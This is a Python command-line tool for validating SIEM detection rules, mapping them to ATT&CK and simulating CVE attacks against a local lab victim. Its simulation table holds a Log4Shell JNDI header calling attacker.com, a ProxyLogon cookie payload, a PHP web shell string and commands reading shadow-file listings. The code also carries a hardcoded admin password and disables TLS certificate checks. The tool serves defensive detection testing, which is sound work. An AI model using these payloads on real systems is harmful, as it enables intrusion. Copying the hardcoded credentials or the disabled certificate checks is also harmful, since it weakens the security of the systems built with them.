"""Top-level CLI entry point."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import click
from rich.console import Console

console = Console()
err_console = Console(stderr=True)


@click.group()
@click.version_option(package_name="detection-validator")
def main() -> None:
    """Detection Validator — multi-SIEM detection validation platform."""


@main.command()
@click.argument("rules", required=False, default=".")
@click.option("--siem", default="opensearch", show_default=True,
              help="SIEM backend(s): opensearch, splunk, or opensearch,splunk")
@click.option("--since", default=24.0, show_default=True,
              help="Only match telemetry from the last N hours (0 = all time).")
@click.option("--index", default="dv-telemetry-*", show_default=True,
              help="OpenSearch index pattern to query.")
@click.option("--output", "-o", default="-", show_default=True,
              help="Write updated JSONL (with validation_status) to this file (- = stdout).")
@click.option("--format", "fmt", default="cli", show_default=True,
              type=click.Choice(["cli", "json"]))
def validate(rules: str, siem: str, since: float, index: str, output: str, fmt: str) -> None:
    """Validate detection rules against live SIEM telemetry.

    Loads every rule under RULES (file or directory), translates each one to a
    live query against OpenSearch / Splunk, and reports whether the rule fired.

    \b
    Workflow:
      dv attack --cve CVE-2021-44228 --target vagrant --agent-port 9098
      dv validate examples/detections/sigma/ --since 1
      dv validate examples/detections/sigma/ --siem opensearch,splunk

    \b
    A rule PASSES if the SIEM returns ≥1 hit matching either:
      • the technique IDs declared in the rule's ATT&CK tags, OR
      • keywords from the rule's detection section found in proctitle / cmd_output.
    """
    import time as _time

    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError
    from detection_validator.validator.engine import validate_corpus, RuleResult
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from pathlib import Path as _Path

    registry = ParserRegistry()
    root = _Path(rules)

    # ── Load rules ────────────────────────────────────────────────────────────
    files = [root] if root.is_file() else sorted(f for f in root.rglob("*") if f.is_file())
    detections = []
    for fp in files:
        try:
            parser = registry.find_parser(fp)
            if parser is None:
                continue
            detections.append(parser.parse_file(fp))
        except (ParseError, Exception):
            continue

    if not detections:
        err_console.print(f"[red]No parseable rules found in:[/] {rules}")
        raise SystemExit(1)

    err_console.print(f"[cyan]Loaded {len(detections)} rule(s)[/]  siem={siem}  since={since}h  index={index}\n")

    # ── Run validation ────────────────────────────────────────────────────────
    t0 = _time.time()
    with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                  transient=True, console=err_console) as prog:
        prog.add_task(f"Querying {siem}…", total=None)
        results: list[RuleResult] = validate_corpus(
            detections, siem=siem, since_hours=since, os_index=index,
        )
    elapsed = _time.time() - t0

    # ── Format output ─────────────────────────────────────────────────────────
    if fmt == "json":
        out = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout
        try:
            payload = [
                {
                    "rule_id": r.rule_id, "name": r.name,
                    "techniques": r.techniques, "siem": r.siem,
                    "query": r.query_desc, "hits": r.hit_count,
                    "status": r.status, "error": r.error,
                    "samples": r.sample_events[:1],
                }
                for r in results
            ]
            print(json.dumps(payload, indent=2, default=str), file=out)
        finally:
            if output != "-":
                out.close()
        return

    # CLI table
    tbl = Table(show_header=True, header_style="bold", box=None, padding=(0, 1))
    tbl.add_column("Rule", style="white", max_width=38)
    tbl.add_column("Techniques", style="cyan", max_width=22)
    tbl.add_column("Hits", justify="right", width=5)
    tbl.add_column("SIEM", width=11)
    tbl.add_column("Status", width=8)

    passed = failed = errors = skipped = 0
    covered_techniques: set[str] = set()

    for r in results:
        icon, style = {
            "pass":  ("✓", "green"),
            "fail":  ("✗", "red"),
            "error": ("!", "yellow"),
            "skip":  ("–", "dim"),
        }.get(r.status, ("?", "white"))

        if r.status == "pass":
            passed += 1
            covered_techniques.update(r.techniques)
        elif r.status == "fail":
            failed += 1
        elif r.status == "error":
            errors += 1
        else:
            skipped += 1

        tech_str = ", ".join(r.techniques[:3]) + ("…" if len(r.techniques) > 3 else "")
        hit_str = str(r.hit_count) if r.status not in ("error", "skip") else "-"
        status_str = f"[{style}]{icon} {r.status.upper()}[/]"

        tbl.add_row(r.name[:38], tech_str, hit_str, r.siem, status_str)

        # Show sample event snippet for passing rules
        if r.status == "pass" and r.sample_events:
            ev = r.sample_events[0]
            snippet = (
                ev.get("proctitle") or ev.get("cmd_output") or
                ev.get("technique") or ev.get("key") or ""
            )
            if snippet:
                tbl.add_row(
                    f"  [dim]{str(snippet)[:60]}[/]", "", "", "", "",
                )

        # Show error detail
        if r.status == "error" and r.error:
            tbl.add_row(f"  [yellow]{r.error[:70]}[/]", "", "", "", "")

    console.print(tbl)
    console.print()

    total = len(results)
    console.print(
        f"[bold]Results:[/] {total} rule(s)  "
        f"[green]{passed} PASS[/]  [red]{failed} FAIL[/]  "
        f"[yellow]{errors} ERROR[/]  [dim]{skipped} SKIP[/]  "
        f"({elapsed:.1f}s)"
    )
    if covered_techniques:
        console.print(
            f"[bold]Covered techniques:[/] [green]{', '.join(sorted(covered_techniques))}[/]"
        )

    # ── Write updated detections (with validation_status) ─────────────────────
    if output != "-":
        with open(output, "w", encoding="utf-8") as fh:
            for det in detections:
                print(det.model_dump_json(), file=fh)
        err_console.print(f"\n[green]✓[/] Updated detections written to [bold]{output}[/]")


@main.command()
@click.option("--format", "fmt", default="cli",
              type=click.Choice(["cli", "json", "html", "sarif", "slack"]))
@click.option("--output", default="-", help="Output file path (- for stdout).")
def report(fmt: str, output: str) -> None:
    """Generate a validation report from the most recent run."""
    console.print(f"[cyan]Generating report:[/] format={fmt}  output={output}")
    console.print("[yellow]TODO: implement report generation[/]")


@main.command()
@click.argument("source_siem")
@click.argument("target_siem")
@click.option("--rules", default=".", help="Path to rules directory.")
def migrate(source_siem: str, target_siem: str, rules: str) -> None:
    """Translate detection rules from one SIEM format to another."""
    console.print(f"[cyan]Migrating:[/] {source_siem} → {target_siem}  rules={rules}")
    console.print("[yellow]TODO: implement migration pipeline[/]")


@main.command()
@click.option("--type", "siem_type", required=True,
              type=click.Choice(["splunk", "opensearch", "elastic", "sentinel", "chronicle", "wazuh"]))
@click.argument("subcommand", default="status")
def siem(siem_type: str, subcommand: str) -> None:
    """Manage SIEM backend connections."""
    console.print(f"[cyan]SIEM {subcommand}:[/] {siem_type}")
    console.print("[yellow]TODO: implement SIEM commands[/]")


@main.command()
@click.argument("subcommand", default="status")
def agent(subcommand: str) -> None:
    """Manage remote telemetry agents."""
    console.print(f"[cyan]Agent {subcommand}[/]")
    console.print("[yellow]TODO: implement agent commands[/]")


@main.command()
@click.option("--format", "fmt", default="svg",
              type=click.Choice(["svg", "png", "json"]))
@click.option("--output", default="coverage-badge.svg")
def badge(fmt: str, output: str) -> None:
    """Generate an ATT&CK coverage badge."""
    console.print(f"[cyan]Generating badge:[/] format={fmt}  output={output}")
    console.print("[yellow]TODO: implement badge generation[/]")


@main.command()
@click.argument("rules", default=".")
def watch(rules: str) -> None:
    """Watch a rules directory for changes and re-validate automatically."""
    console.print(f"[cyan]Watching:[/] {rules}")
    console.print("[yellow]TODO: implement file watcher[/]")


@main.command()
@click.argument("rules", default=".")
@click.option("--siem", default="opensearch")
def deploy(rules: str, siem: str) -> None:
    """Deploy detection rules to a SIEM backend."""
    console.print(f"[cyan]Deploying rules:[/] {rules}  siem={siem}")
    console.print("[yellow]TODO: implement deployment[/]")


@main.command()
@click.argument("path", default=".", type=click.Path(exists=True))
@click.option("--output", "-o", default="-", help="Output JSONL file path (- for stdout).")
@click.option("--format", "fmt", default=None,
              type=click.Choice(["sigma", "splunk", "kql", "yara", "elastic_eql",
                                 "splunk_security_content", "generic_yaml"]),
              help="Force a specific parser instead of auto-detecting.")
@click.option("--recursive/--no-recursive", default=True, show_default=True,
              help="Recursively scan subdirectories.")
@click.option("--strict", is_flag=True, default=False,
              help="Abort on the first parse error instead of skipping.")
def ingest(path: str, output: str, fmt: str | None, recursive: bool, strict: bool) -> None:
    """Scan PATH for detection rules and emit CanonicalDetection JSONL.

    PATH may be a single file or a directory.  Each successfully parsed rule
    is written as one JSON object per line to OUTPUT (default: stdout).

    Examples:

      dv ingest detections/ -o canonical.jsonl

      dv ingest rule.yml --format sigma

      dv ingest detections/ --strict --output all.jsonl
    """
    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError

    registry = ParserRegistry()
    root = Path(path)
    out = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout

    total = 0
    errors = 0

    try:
        if root.is_file():
            files = [root]
        else:
            glob = root.rglob("*") if recursive else root.glob("*")
            files = [p for p in sorted(glob) if p.is_file()]

        for file_path in files:
            try:
                if fmt:
                    parser = next((p for p in registry.parsers if p.name == fmt), None)
                    if parser is None:
                        err_console.print(f"[red]Unknown parser: {fmt}[/]")
                        raise SystemExit(1)
                    detection = parser.parse_file(file_path)
                else:
                    parser = registry.find_parser(file_path)
                    if parser is None:
                        continue
                    detection = parser.parse_file(file_path)

                line = detection.model_dump_json()
                print(line, file=out)
                total += 1
                err_console.print(f"[green]✓[/] {file_path}  ({parser.name})")

            except ParseError as exc:
                errors += 1
                err_console.print(f"[red]✗[/] {file_path}: {exc}")
                if strict:
                    raise SystemExit(1)
            except Exception as exc:  # noqa: BLE001
                errors += 1
                err_console.print(f"[red]✗[/] {file_path}: {exc}")
                if strict:
                    raise SystemExit(1)

    finally:
        if output != "-":
            out.close()

    err_console.print(f"\n[bold]Ingested:[/] {total} rules  [red]errors:[/] {errors}")
    if strict and errors:
        raise SystemExit(1)


@main.group()
def intel() -> None:
    """Manage local intelligence caches (ATT&CK, CVE, etc.)."""


@intel.command("update")
@click.option("--source", default="attack",
              type=click.Choice(["attack", "cve", "all"]),
              show_default=True,
              help="Intelligence source to refresh.")
@click.option("--domain", default="enterprise-attack",
              type=click.Choice(["enterprise-attack", "mobile-attack", "ics-attack"]),
              show_default=True,
              help="ATT&CK domain(s) to download (attack source only).")
@click.option("--cve", "cve_ids", default=None,
              help="Comma-separated CVE IDs to refresh (cve source only; omit for full catalog).")
@click.option("--force", is_flag=True, default=False,
              help="Force download even if cache is still fresh.")
def intel_update(source: str, domain: str, cve_ids: str | None, force: bool) -> None:
    """Refresh local intelligence caches.

    Examples:

      dv intel update --source attack

      dv intel update --source attack --domain ics-attack --force

      dv intel update --source cve

      dv intel update --source cve --cve CVE-2021-44228,CVE-2022-30190
    """
    if source in ("attack", "all"):
        from detection_validator.mappers.attack_mapper import AttackKnowledgeBase

        domains = (
            ["enterprise-attack", "mobile-attack", "ics-attack"]
            if domain == "all"
            else [domain]
        )
        for d in domains:
            err_console.print(f"[cyan]Refreshing ATT&CK bundle:[/] {d}")
            kb = AttackKnowledgeBase(domain=d)
            try:
                kb.ensure_loaded(force_refresh=force)
                err_console.print(f"[green]✓[/] {d}: {len(kb._techniques)} techniques indexed")
            except Exception as exc:
                err_console.print(f"[red]✗[/] {d}: {exc}")

    if source in ("cve", "all"):
        from detection_validator.mappers.cve_mapper import CVEKnowledgeBase

        err_console.print("[cyan]Refreshing CVE intelligence caches[/]")
        kb = CVEKnowledgeBase()
        ids = [c.strip() for c in cve_ids.split(",")] if cve_ids else None
        try:
            kb.update(cve_ids=ids, force=force)
            if ids:
                err_console.print(f"[green]✓[/] CVE cache refreshed for: {', '.join(ids)}")
            else:
                kev_size = len(kb._kev_catalog or {})
                ctid_size = len(kb._ctid_catalog or {})
                err_console.print(
                    f"[green]✓[/] KEV: {kev_size} entries  CTID: {ctid_size} entries"
                )
        except Exception as exc:
            err_console.print(f"[red]✗[/] CVE update failed: {exc}")


@main.command()
@click.option("--input", "-i", "input_file", required=True,
              type=click.Path(exists=True),
              help="JSONL file of CanonicalDetection objects (from dv ingest).")
@click.option("--output", "-o", default="-",
              help="Output JSONL file path (- for stdout).")
@click.option("--mode", default="hybrid",
              type=click.Choice(["explicit", "inferred", "hybrid"]),
              show_default=True,
              help="Mapping strategy.")
@click.option("--llm", is_flag=True, default=False,
              help="Enable LLM-based inference (requires ANTHROPIC_API_KEY).")
@click.option("--min-confidence", default=0.50, show_default=True,
              help="Minimum confidence threshold when applying inferred techniques.")
@click.option("--domain", default="enterprise-attack",
              type=click.Choice(["enterprise-attack", "mobile-attack", "ics-attack"]),
              show_default=True)
def map(
    input_file: str,
    output: str,
    mode: str,
    llm: bool,
    min_confidence: float,
    domain: str,
) -> None:
    """Map detection rules to MITRE ATT&CK techniques.

    Reads CanonicalDetection JSONL (from ``dv ingest``), validates and/or
    infers ATT&CK technique tags, and writes updated detections to OUTPUT.

    Examples:

      dv map --input canonical.jsonl --output mapped.jsonl --mode hybrid

      dv map -i canonical.jsonl -o mapped.jsonl --mode inferred --llm
    """
    from detection_validator.mappers.attack_mapper import (
        AttackKnowledgeBase,
        AttackMapper,
        MappingMode,
    )
    from detection_validator.normalizer.schema import CanonicalDetection

    kb = AttackKnowledgeBase(domain=domain)
    try:
        kb.ensure_loaded()
    except Exception as exc:
        err_console.print(f"[yellow]⚠ Could not load ATT&CK knowledge base: {exc}[/]")
        err_console.print("[yellow]Proceeding without KB validation (inferred mode only)[/]")

    mapper = AttackMapper(kb=kb, use_llm=llm)
    out = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout

    total = errors = warnings_count = applied = 0

    try:
        with open(input_file, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    detection = CanonicalDetection.model_validate_json(line)
                except Exception as exc:
                    err_console.print(f"[red]Parse error:[/] {exc}")
                    errors += 1
                    continue

                result = mapper.map_detection(detection, mode=mode)
                updated = mapper.apply(detection, result, min_confidence=min_confidence)

                if result.errors:
                    for e in result.errors:
                        err_console.print(f"[red]  ✗[/] {detection.name}: {e}")
                    errors += len(result.errors)

                if result.warnings:
                    for w in result.warnings:
                        err_console.print(f"[yellow]  ⚠[/] {detection.name}: {w}")
                    warnings_count += len(result.warnings)

                new_count = len(updated.mitre_techniques) - len(detection.mitre_techniques)
                if new_count > 0:
                    applied += new_count

                print(updated.model_dump_json(), file=out)
                total += 1

    finally:
        if output != "-":
            out.close()

    err_console.print(
        f"\n[bold]Mapped:[/] {total} detections  "
        f"[green]+{applied} techniques[/]  "
        f"[yellow]warnings: {warnings_count}[/]  "
        f"[red]errors: {errors}[/]"
    )


@main.command("cve-coverage")
@click.option("--cve", "cve_ids", required=True,
              help="Comma-separated CVE IDs to analyze, e.g. CVE-2021-44228,CVE-2022-30190.")
@click.option("--detections", "-d", default=None,
              type=click.Path(exists=True),
              help="JSONL file of CanonicalDetection objects (from dv ingest/map). "
                   "Omit to check technique coverage without a corpus.")
@click.option("--llm", is_flag=True, default=False,
              help="Enable LLM-based technique inference (requires ANTHROPIC_API_KEY).")
@click.option("--output", "-o", default="-",
              help="Output file path (- for stdout).")
@click.option("--format", "fmt", default="cli",
              type=click.Choice(["cli", "json"]),
              show_default=True)
@click.option("--min-risk", default=0.0, show_default=True,
              help="Only include CVEs with residual_risk_score ≥ this value.")
def cve_coverage(
    cve_ids: str,
    detections: str | None,
    llm: bool,
    output: str,
    fmt: str,
    min_risk: float,
) -> None:
    """Analyze ATT&CK technique coverage for one or more CVEs.

    For each CVE, the command:

    \b
      1. Fetches metadata from NVD, CISA KEV, CTID, and EPSS.
      2. Maps the CVE to ATT&CK techniques (CTID → CWE → LLM).
      3. Checks the detection corpus for coverage of each technique.
      4. Computes residual_risk = CVSS × EPSS × (1 − coverage_ratio).

    Examples:

    \b
      dv cve-coverage --cve CVE-2021-44228
      dv cve-coverage --cve CVE-2021-44228,CVE-2022-30190 -d mapped.jsonl
      dv cve-coverage --cve CVE-2021-44228 -d mapped.jsonl --llm --format json
    """
    from detection_validator.mappers.cve_mapper import (
        CVECoverageAnalyzer,
        CVEKnowledgeBase,
        CVEToTechniqueMapper,
    )
    from detection_validator.normalizer.schema import CanonicalDetection

    ids = [c.strip().upper() for c in cve_ids.split(",") if c.strip()]

    corpus: list[CanonicalDetection] = []
    if detections:
        with open(detections, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    corpus.append(CanonicalDetection.model_validate_json(line))
                except Exception as exc:
                    err_console.print(f"[yellow]⚠ Skipping malformed detection: {exc}[/]")

    kb = CVEKnowledgeBase()
    mapper = CVEToTechniqueMapper(kb=kb, use_llm=llm)
    analyzer = CVECoverageAnalyzer(mapper=mapper)

    results = analyzer.analyze_corpus(ids, corpus)
    results = [r for r in results if r.residual_risk_score >= min_risk]

    out_file = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout
    out_console = Console(file=out_file, highlight=False)
    try:
        if fmt == "json":
            payload = []
            for r in results:
                payload.append({
                    "cve_id": r.cve_id,
                    "cvss_score": r.cvss_score,
                    "epss_score": r.epss_score,
                    "in_kev": r.in_kev,
                    "coverage_ratio": r.coverage_ratio,
                    "residual_risk_score": r.residual_risk_score,
                    "covered_techniques": r.covered_technique_ids,
                    "uncovered_techniques": r.uncovered_technique_ids,
                    "techniques": [
                        {
                            "technique_id": t.technique_id,
                            "tactic": t.tactic,
                            "confidence": t.confidence,
                            "source": t.source,
                        }
                        for t in r.techniques
                    ],
                    "covering_detections": r.covering_detections,
                })
            print(json.dumps(payload, indent=2), file=out_file)
        else:
            for r in results:
                kev_flag = "[red]KEV[/] " if r.in_kev else ""
                out_console.print(
                    f"\n[bold cyan]{r.cve_id}[/]  {kev_flag}"
                    f"CVSS={r.cvss_score or '?'}  "
                    f"EPSS={r.epss_score or '?'}  "
                    f"coverage={r.coverage_ratio:.0%}  "
                    f"residual_risk=[bold]{r.residual_risk_score:.3f}[/]"
                )
                if r.techniques:
                    for t in r.techniques:
                        covered = t.technique_id in r.covered_technique_ids
                        icon = "[green]✓[/]" if covered else "[red]✗[/]"
                        det_names = r.covering_detections.get(t.technique_id, [])
                        det_str = f" ← {', '.join(det_names[:3])}" if det_names else ""
                        out_console.print(
                            f"  {icon} {t.technique_id}  {t.tactic}  "
                            f"conf={t.confidence:.2f}  [{t.source}]{det_str}"
                        )
                else:
                    out_console.print("  [yellow](no techniques mapped)[/]")
    finally:
        if output != "-":
            out_file.close()


@main.command()
@click.option("--detections", "-d", required=True,
              type=click.Path(exists=True),
              help="JSONL file of mapped CanonicalDetection objects (from dv map).")
@click.option("--output", "-o", default="navigator-layer.json", show_default=True,
              help="Output file path for the Navigator layer JSON.")
@click.option("--name", default="Detection Coverage", show_default=True,
              help="Layer name shown in the Navigator UI.")
@click.option("--description", default="Generated by detection-validator", show_default=True,
              help="Layer description shown in the Navigator UI.")
def navigator(detections: str, output: str, name: str, description: str) -> None:
    """Export an ATT&CK Navigator layer from a mapped detection corpus.

    The layer JSON can be loaded directly into the MITRE ATT&CK Navigator
    at https://mitre-attack.github.io/attack-navigator/ to visualise which
    techniques your detections cover.

    \b
    Workflow:
      detection-validator ingest detections/ -o canonical.jsonl
      detection-validator map -i canonical.jsonl -o mapped.jsonl
      detection-validator navigator -d mapped.jsonl -o layer.json
      # then open https://mitre-attack.github.io/attack-navigator/
      # and load layer.json via Open Existing Layer → Upload from local

    Examples:

    \b
      detection-validator navigator -d mapped.jsonl
      detection-validator navigator -d mapped.jsonl -o my-layer.json --name "SOC Coverage Q2"
    """
    import json as _json
    from detection_validator.normalizer.schema import CanonicalDetection
    from detection_validator.coverage.matrix import CoverageMatrix

    corpus: list[CanonicalDetection] = []
    with open(detections, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                corpus.append(CanonicalDetection.model_validate_json(line))
            except Exception as exc:
                err_console.print(f"[yellow]⚠ Skipping malformed detection: {exc}[/]")

    matrix = CoverageMatrix(corpus)
    layer = matrix.to_navigator_layer(name=name, description=description)

    with open(output, "w", encoding="utf-8") as fh:
        _json.dump(layer, fh, indent=2)

    technique_count = len(layer["techniques"])
    tactic_set = {t["tactic"] for t in layer["techniques"]}
    console.print(
        f"[green]✓[/] Navigator layer written to [bold]{output}[/]  "
        f"({technique_count} techniques across {len(tactic_set)} tactics)"
    )
    console.print(
        "  Open [cyan]https://mitre-attack.github.io/attack-navigator/[/] "
        "→ [bold]Open Existing Layer[/] → [bold]Upload from local[/]"
    )


def _run_attack_direct(scenario_path: Path, agent_port: str, delay: float) -> None:
    """Run an attack scenario by calling the victim agent directly (vagrant mode)."""
    import time as _time
    import urllib.request

    try:
        import yaml
    except ImportError:
        err_console.print("[red]pyyaml not installed. Run: pip install pyyaml[/]")
        raise SystemExit(1)

    # Map techniques to concrete step payloads (mirrors docker/atomic-runner/techniques.py)
    _TECHNIQUE_STEPS: dict[str, list[dict]] = {
        "T1190": [
            {"technique": "T1190", "variant": "log4shell", "event_type": "SYSCALL",
             "key": "network_connect", "exe": "/usr/bin/curl", "uid": "33",
             "command": "curl -sk http://127.0.0.1:8080/ -H 'X-Api-Version: ${jndi:ldap://attacker.com/exploit}' 2>&1 | head -5",
             "extra": {"http_method": "GET", "cve": "CVE-2021-44228"}},
            {"technique": "T1190", "variant": "proxylogon", "event_type": "SYSCALL",
             "key": "network_connect", "exe": "/usr/bin/curl", "uid": "33",
             "command": "curl -sk http://127.0.0.1:443/ews/exchange.asmx -H 'Cookie: X-BEResource=a]@SERVER:444/EWS/Exchange.asmx?~3;' 2>&1 | head -5",
             "extra": {"http_method": "POST", "cve": "CVE-2021-26855"}},
        ],
        "T1059.004": [
            {"technique": "T1059.004", "event_type": "SYSCALL", "key": "shell_exec",
             "exe": "/bin/bash", "uid": "33",
             "command": "id && whoami && uname -a",
             "extra": {"interpreter": "bash"}},
        ],
        "T1068": [
            {"technique": "T1068", "event_type": "SYSCALL", "key": "priv_change",
             "exe": "/tmp/exploit", "uid": "1001",
             "command": "ls -la /etc/shadow 2>&1 | head -3",
             "extra": {"description": "privilege escalation attempt"}},
        ],
        "T1547.012": [
            {"technique": "T1547.012", "event_type": "PATH", "key": "file_write",
             "exe": "/bin/cp", "uid": "0",
             "command": "ls /usr/lib/cups/backend/ 2>/dev/null | head -5",
             "extra": {"path": "/usr/lib/cups/backend/malicious"}},
        ],
        "T1574.001": [
            {"technique": "T1574.001", "event_type": "PATH", "key": "file_write",
             "exe": "/bin/bash", "uid": "1001",
             "command": "echo 'hijack library drop' && ls /tmp/ | head -5",
             "extra": {"path": "/tmp/libmalicious.so"}},
        ],
        "T1505.003": [
            {"technique": "T1505.003", "event_type": "PATH", "key": "file_write",
             "exe": "/usr/bin/php", "uid": "33",
             "command": "ls /var/www/ 2>/dev/null | head -5",
             "extra": {"path": "/var/www/html/shell.php", "content": "<?php system($_GET['cmd']); ?>"}},
        ],
        "T1078": [
            {"technique": "T1078", "event_type": "SYSCALL", "key": "identity_check",
             "exe": "/usr/bin/id", "uid": "33",
             "command": "id && groups",
             "extra": {}},
        ],
        "T1552.001": [
            {"technique": "T1552.001", "event_type": "PATH", "key": "sensitive_file",
             "exe": "/bin/cat", "uid": "0",
             "command": "ls -la /etc/passwd /etc/shadow 2>&1",
             "extra": {"files": ["/etc/passwd", "/etc/shadow"]}},
        ],
    }

    if not scenario_path.exists():
        err_console.print(f"[red]Scenario file not found: {scenario_path}[/]")
        raise SystemExit(1)

    with open(scenario_path) as fh:
        scenario = yaml.safe_load(fh)

    steps_config = scenario.get("steps", [])
    console.print(f"[cyan]Scenario:[/] {scenario.get('name', scenario_path.name)}")
    if scenario.get("cve"):
        console.print(f"  CVE: [bold]{scenario['cve']}[/]  CVSS: {scenario.get('cvss', '?')}")
    console.print()

    simulate_url = f"http://localhost:{agent_port}/simulate"
    total = 0
    for step_cfg in steps_config:
        tech_id = step_cfg.get("technique", "")
        variant = step_cfg.get("variant")
        steps = _TECHNIQUE_STEPS.get(tech_id, [])
        if variant:
            steps = [s for s in steps if s.get("variant") == variant] or steps[:1]
        if not steps:
            err_console.print(f"[yellow]  ⚠ No steps for technique {tech_id}[/]")
            continue
        for step in steps:
            payload = json.dumps(step).encode()
            req = urllib.request.Request(
                simulate_url,
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            try:
                with urllib.request.urlopen(req, timeout=15) as resp:
                    result = json.loads(resp.read())
                rc = result.get("returncode", "?")
                out = (result.get("output") or "")[:80].replace("\n", " ")
                icon = "[green]✓[/]" if rc == 0 else "[red]✗[/]"
                console.print(f"  {icon} [bold]{tech_id}[/]  key={step.get('key','?')}  rc={rc}")
                if out:
                    console.print(f"    [dim]{out}[/]")
                total += 1
            except Exception as exc:
                err_console.print(f"  [red]✗ {tech_id}: {exc}[/]")
            _time.sleep(delay)

    console.print(f"\n[bold green]✓ {total} steps executed.[/]")


@main.command()
@click.option("--cve", "cve_id", default=None,
              help="CVE ID to simulate (e.g. CVE-2021-44228). Looks up the matching scenario.")
@click.option("--scenario", "scenario_file", default=None,
              type=click.Path(),
              help="Path to a scenario YAML (alternative to --cve).")
@click.option("--victim", default="dv-linux-victim", show_default=True,
              help="Victim container name or hostname.")
@click.option("--agent-port", default="9099", show_default=True,
              help="Victim agent HTTP port.")
@click.option("--target", default="docker",
              type=click.Choice(["docker", "vagrant"]),
              show_default=True,
              help="Attack target: docker (run atomic-runner container) or vagrant (call agent directly).")
@click.option("--watch", is_flag=True, default=False,
              help="After the run, show the attack events that landed in OpenSearch.")
@click.option("--delay", default=1.5, show_default=True,
              help="Seconds between attack steps.")
def attack(
    cve_id: str | None,
    scenario_file: str | None,
    victim: str,
    agent_port: str,
    target: str,
    watch: bool,
    delay: float,
) -> None:
    """Simulate a CVE-based attack against the Linux victim container.

    Use --target docker (default) to run via the atomic-runner container,
    or --target vagrant to call the Vagrant VM agent directly from Python.

    \b
    Examples:
      dv attack --cve CVE-2021-44228
      dv attack --cve CVE-2021-34527 --watch
      dv attack --cve CVE-2021-44228 --target vagrant
      dv attack --scenario docker/atomic-runner/scenarios/proxylogon-cve-2021-26855.yml
    """
    import subprocess
    import time as _time

    # ── resolve scenario path ────────────────────────────────────────────────
    _CVE_TO_SCENARIO = {
        "CVE-2021-44228": "log4shell-cve-2021-44228.yml",
        "CVE-2021-34527": "printnightmare-cve-2021-34527.yml",
        "CVE-2021-26855": "proxylogon-cve-2021-26855.yml",
    }
    if cve_id:
        cve_id = cve_id.upper().strip()
        fname = _CVE_TO_SCENARIO.get(cve_id)
        if fname is None:
            err_console.print(f"[red]No built-in scenario for {cve_id}.[/]")
            err_console.print(f"Available: {', '.join(_CVE_TO_SCENARIO)}")
            raise SystemExit(1)
        scenario_in_container = f"/scenarios/{fname}"
        local_scenario = Path(__file__).parents[2] / "docker" / "atomic-runner" / "scenarios" / fname
    elif scenario_file:
        scenario_in_container = scenario_file
        local_scenario = Path(scenario_file)
    else:
        err_console.print("[red]Provide --cve or --scenario.[/]")
        raise SystemExit(1)

    # ── verify victim agent is reachable ────────────────────────────────────
    import urllib.request
    import urllib.error
    agent_url = f"http://localhost:{agent_port}/health"
    try:
        urllib.request.urlopen(agent_url, timeout=3)
    except Exception:
        err_console.print(f"[red]✗ Victim agent not reachable at {agent_url}[/]")
        if target == "vagrant":
            err_console.print("  Start the Vagrant VM:  cd vagrant && vagrant up")
        else:
            err_console.print("  Start it with:  docker run -d --name dv-linux-victim \\")
            err_console.print("    --network detectval-lab -p 9099:9099 \\")
            err_console.print("    detection-validator/linux-victim:dev")
        raise SystemExit(1)

    console.print(f"\n[bold cyan]⚔  Running attack scenario[/]  cve={cve_id or scenario_file}  target={target}")
    console.print(f"   Victim: [yellow]{victim}[/]  agent: {agent_url}\n")

    # ── vagrant mode: call agent directly from Python ────────────────────────
    if target == "vagrant":
        _run_attack_direct(local_scenario, agent_port, delay)
        # skip the Docker runner section below
    else:
        # ── docker mode: run the atomic-runner container ─────────────────────
        cmd = [
            "docker", "run", "--rm",
            "--network", "detectval-lab",
            "-e", f"RUNNER_TARGET_HOST={victim}",
            "-e", f"RUNNER_AGENT_PORT={agent_port}",
            "-e", f"RUNNER_STEP_DELAY={delay}",
            "detection-validator/atomic-runner:dev",
            "run", "--scenario", scenario_in_container,
        ]
        result = subprocess.run(cmd)
        if result.returncode != 0:
            err_console.print(f"[red]Runner exited with code {result.returncode}[/]")
            raise SystemExit(result.returncode)

    # ── optionally show events from OpenSearch ───────────────────────────────
    if watch:
        import urllib.request
        import urllib.error

        _time.sleep(5)  # let Vector flush
        console.print("\n[bold]Attack events in OpenSearch (last 20):[/]\n")
        os_url = "https://localhost:9200"
        os_user = "admin"
        os_pass = "DetectVal123!"
        query = json.dumps({
            "size": 20,
            "query": {"term": {"source.keyword": "auditd-agent"}},
            "_source": ["timestamp", "technique", "key", "exe", "uid", "cmd_output"],
        }).encode()
        try:
            import base64
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            creds = base64.b64encode(f"{os_user}:{os_pass}".encode()).decode()
            req = urllib.request.Request(
                f"{os_url}/dv-telemetry-*/_search",
                data=query,
                headers={"Content-Type": "application/json", "Authorization": f"Basic {creds}"},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                data = json.loads(resp.read())
            hits = data.get("hits", {}).get("hits", [])
            if not hits:
                console.print("  [yellow]No auditd-agent events yet — Vector may still be flushing.[/]")
            for h in hits:
                s = h["_source"]
                out = s.get("cmd_output", "")[:100].replace("\n", " ")
                console.print(
                    f"  [green]{s.get('technique','?'):12s}[/]  "
                    f"[cyan]{s.get('key','?'):20s}[/]  "
                    f"exe={s.get('exe','?'):30s}  uid={s.get('uid','?')}"
                )
                if out:
                    console.print(f"    [dim]{out}[/]")
        except Exception as exc:
            err_console.print(f"[yellow]Could not query OpenSearch: {exc}[/]")

    console.print(
        f"\n[bold green]✓ Done.[/] View events:\n"
        f"  OpenSearch Dashboards: [cyan]http://localhost:5601[/]\n"
        f"  Splunk mock UI:        [cyan]http://localhost:8000[/]"
    )


if __name__ == "__main__":
    main()
